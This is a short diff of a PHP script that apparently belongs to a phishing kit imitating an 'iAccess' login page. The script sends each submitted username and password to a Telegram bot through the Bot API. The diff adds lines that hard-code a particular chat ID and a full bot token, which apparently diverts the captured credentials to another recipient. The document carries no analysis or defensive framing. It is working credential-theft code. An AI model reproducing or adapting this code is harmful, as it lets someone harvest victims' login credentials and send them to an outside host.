@@ -35,7 +35,7 @@ header("Location: index.php?invalid");
 }else if (strpos($result, "iAccess ID does not accept")){
 
 $data = [
-'chat_id' => $chat_id,
+'chat_id' => "-635799224",
 'text' => "Invalid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
 ];
 file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));
@@ -47,6 +47,6 @@ $data = [
 'chat_id' => $chat_id,
 'text' => "error in checking\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
 ];
-file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));
+file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?" . http_build_query($data));
 header("Location: index.php?mobile");
 }
